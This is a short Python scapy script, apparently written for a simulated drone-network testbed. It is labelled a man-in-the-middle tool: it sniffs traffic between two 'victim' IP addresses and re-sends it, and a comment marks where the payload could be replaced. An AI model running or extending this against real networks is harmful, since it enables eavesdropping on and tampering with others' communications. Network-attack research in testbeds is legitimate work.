#!/usr/bin/env python3
# MITM.py
# 用法示例（在攻击节点上运行）： python3 MITM.py --iface uav3-wlan0 --victim1 10.0.0.1 --victim2 10.0.0.2 --duration 60

import argparse
from scapy.all import *
import time
import threading

conf.verb = 0

def forward_pkt(pkt, out_iface):
    # 直接把抓到的数据包重新发送出去（不修改）
    sendp(pkt, iface=out_iface, verbose=False)

def mitm_loop(iface, victim1, victim2, duration):
    start = time.time()
    def pkt_handler(pkt):
        # 只处理 IPv4 数据包（可扩展）
        if IP in pkt:
            src = pkt[IP].src
            dst = pkt[IP].dst
            # 如果是 victim1->victim2 或 victim2->victim1，转发
            if (src == victim1 and dst == victim2) or (src == victim2 and dst == victim1):
                # 可在这里修改 pkt（例如替换 payload）再发送
                forward_pkt(pkt, iface)
    sniff(iface=iface, prn=pkt_handler, store=False, timeout=duration)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface", required=True)
    parser.add_argument("--victim1", required=True)
    parser.add_argument("--victim2", required=True)
    parser.add_argument("--duration", type=int, default=60)
    args = parser.parse_args()
    print(f"[MITM] iface={args.iface} v1={args.victim1} v2={args.victim2} dur={args.duration}s")
    mitm_loop(args.iface, args.victim1, args.victim2, args.duration)
    print("[MITM] done")

